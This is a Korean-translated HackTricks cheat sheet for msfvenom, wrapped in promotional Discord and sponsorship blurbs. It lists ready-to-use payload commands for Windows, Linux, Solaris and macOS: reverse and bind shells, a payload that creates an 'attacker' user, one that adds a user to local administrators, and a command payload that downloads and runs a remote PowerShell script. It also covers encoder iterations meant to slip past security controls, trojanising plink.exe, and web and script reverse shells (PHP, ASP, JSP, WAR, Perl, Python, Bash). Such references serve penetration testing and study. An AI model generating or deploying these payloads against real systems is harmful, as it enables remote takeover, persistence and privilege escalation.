# MSFVenom - CheatSheet

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

경험 많은 해커와 버그 바운티 헌터와 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 참여하세요!

**해킹 통찰력**\
해킹의 스릴과 도전을 다루는 콘텐츠와 상호 작용하세요.

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계를 따라가세요.

**최신 공지사항**\
새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대한 정보를 받아보세요.

**[Discord](https://discord.com/invite/N3FrSbmwdy)에 참여**하여 최고의 해커들과 협업을 시작하세요!

***

## 기본 msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

아키텍처를 지정하기 위해 `-a`를 사용하거나 `--platform`을 사용할 수도 있습니다.

## 목록
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## 쉘코드를 생성할 때 일반적으로 사용되는 매개변수

When creating a shellcode, there are several common parameters that are often used. These parameters help customize the shellcode to meet specific requirements. The following are some of the commonly used parameters:

- **`-p` or `--payload`**: Specifies the payload to be used in the shellcode. This can be a specific exploit or payload type.

- **`-f` or `--format`**: Specifies the output format of the shellcode. This can be options like `raw`, `c`, `exe`, `elf`, `dll`, etc.

- **`-e` or `--encoder`**: Specifies the encoder to be used to obfuscate the shellcode. Encoders help in bypassing certain security measures.

- **`-b` or `--bad-chars`**: Specifies any characters that should be avoided in the shellcode. These characters may cause issues or be blocked by security mechanisms.

- **`-i` or `--iterations`**: Specifies the number of times the encoder should iterate over the shellcode. Increasing the number of iterations can increase the complexity of the obfuscation.

- **`-a` or `--arch`**: Specifies the architecture for which the shellcode is being generated. This can be options like `x86`, `x64`, `armle`, `armbe`, etc.

- **`-n` or `--nopsled`**: Specifies the size of the NOP sled to be used in the shellcode. NOP sleds are used for alignment and to provide a buffer for the payload.

- **`-s` or `--space`**: Specifies the maximum size of the shellcode. This can be useful when trying to fit the shellcode into a specific memory space.

These parameters can be combined and customized according to the specific requirements of the shellcode being created.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Reverse Shell**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### 바인드 쉘

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### 사용자 생성

{% code overflow="wrap" %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD 쉘

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **명령 실행**

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### 인코더

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 실행 파일 내에 포함

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Linux 페이로드

### 리버스 쉘

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### 바인드 쉘

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% code overflow="wrap" %}

### SunOS (Solaris)

{% endcode %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
{% endcode %}

## **MAC 페이로드**

### **리버스 쉘:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **바인드 쉘**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **웹 기반 Payloads**

### **PHP**

#### Reverse shell

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### 역쉘

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
{% endcode %}

### JSP

#### 리버스 쉘

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### WAR

#### 리버스 쉘

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% code %}

### NodeJS

### 노드JS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **스크립트 언어 페이로드**

### **펄 (Perl)**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% code overflow="wrap" %}

### **파이썬**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

경험 많은 해커와 버그 바운티 헌터들과 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 가입하세요!

**해킹 통찰력**\
해킹의 스릴과 도전에 대해 자세히 알아보는 콘텐츠와 상호작용하세요.

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계를 따라가세요.

**최신 공지사항**\
새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대해 최신 정보를 받아보세요.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**에 가입하여 최고의 해커들과 협업을 시작하세요!

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**로 AWS 해킹을 처음부터 전문가까지 배워보세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
